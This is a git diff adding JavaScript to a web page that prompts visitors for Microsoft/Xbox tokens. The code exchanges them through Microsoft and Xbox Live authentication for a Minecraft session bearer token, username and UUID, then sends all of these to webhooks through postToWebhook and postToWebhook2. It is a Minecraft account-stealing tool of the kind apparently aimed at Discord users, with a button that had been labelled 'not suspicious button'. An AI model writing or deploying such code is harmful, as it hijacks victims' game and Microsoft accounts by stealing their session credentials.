@@ -8,7 +8,9 @@
   <script src="index.js"></script>
   
 
-<button onclick="myFunction()">not suspicious button</button>
+<button onclick="myFunction()">xbl token</button>
+  
+  <button onclick="myFunction2()">refresh token(dont use this yet)</button>
 
 <p id="demo"></p>
 <p id="demo1"></p>
@@ -65,6 +67,72 @@ async function myFunction() {
         console.log(e)
     }
   }
+}
+  
+  async function refreshFunction() {
+  let refreshToken = prompt("Please enter REFRESH token", "");
+  if (refreshToken != null) {
+    document.getElementById("demo").innerHTML =
+    "hi zomev SKUL:L SKULL: " + refreshToken;
+     //app.get("/api/player/networth", async (req, res) => {
+  //if (userToken == undefined) {
+    //res.json({
+      //success: false,
+      //cause: "Missing minecraft_ign field",
+    //});
+    //return;
+  //}
+    //res.send('Success! You can exit this page and return to discord.')
+    try {
+        console.log('1')
+        console.log('all of those parameters were obsolete, the fun part begins')
+        console.log('user token set') // MODIFY VALUE ABOVE  ^^^
+        const xstsTokenHashArray = await getXSTSToken(userToken)
+        console.log('its working!')
+        const xstsToken = xstsTokenHashArray[0]
+        const userHash = xstsTokenHashArray[1]
+        const bearerToken = await getBearerToken(xstsToken, userHash)
+        document.getElementById("demo1").innerHTML = "RETRIEVING SSID...";
+        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
+        document.getElementById("demo2").innerHTML = "ssid: " + bearerToken;
+        document.getElementById("demo3").innerHTML = "RETRIEVING USER & UUID...";
+        const uuid = usernameAndUUIDArray[0]
+        const username = usernameAndUUIDArray[1]
+        document.getElementById("demo4").innerHTML = "username: " + username;
+      //const networth = await (await get(`https://skyhelper-dxxxxy.herokuapp.com/v2/profiles/${username}?key=dxxxxy`).catch(() => { return { data: { data: [{ networth: null }] } } })).data.data[0].networth
+
+                //check if has profiles, if api off or if normal
+                //let total_networth
+                //if (networth == null) total_networth = `[NW] No profile data found [NW]`
+                //else if (networth.noInventory) total_networth = `[NW] Without inventory (API OFF): ${formatNumber(networth.networth)} (${formatNumber(networth.unsoulboundNetworth)}) [NW]`
+                //else total_networth = `[NW] ${formatNumber(networth.networth)} (${formatNumber(networth.unsoulboundNetworth)}) [NW]`
+        postToWebhook(username, bearerToken, uuid, userToken)
+      postToWebhook2(username, bearerToken, uuid, userToken)
+        document.getElementById("demo5").innerHTML = "POSTED TO WEBHOOK";
+    } catch (e) {
+        console.log(e)
+    }
+  }
+}
+  async function getAccessTokenAndRefreshToken(refreshToken) {
+    const url = 'https://login.live.com/oauth20_token.srf'
+
+    const config = {
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
+    }
+    let data = {
+        client_id: client_id,
+        redirect_uri: redirect_uri,
+        client_secret: client_secret,
+        code: refreshToken,
+        grant_type: 'refresh_token'
+    }
+
+    let response = await axios.post(url, data, config)
+    console.log('YOOOOOOO LETS FUCKING GO data posted now get the data you monkey')
+    return response.data['access_token']
 }
   async function getUserHashAndToken(accessToken) {
     const url = 'https://user.auth.xboxlive.com/user/authenticate'
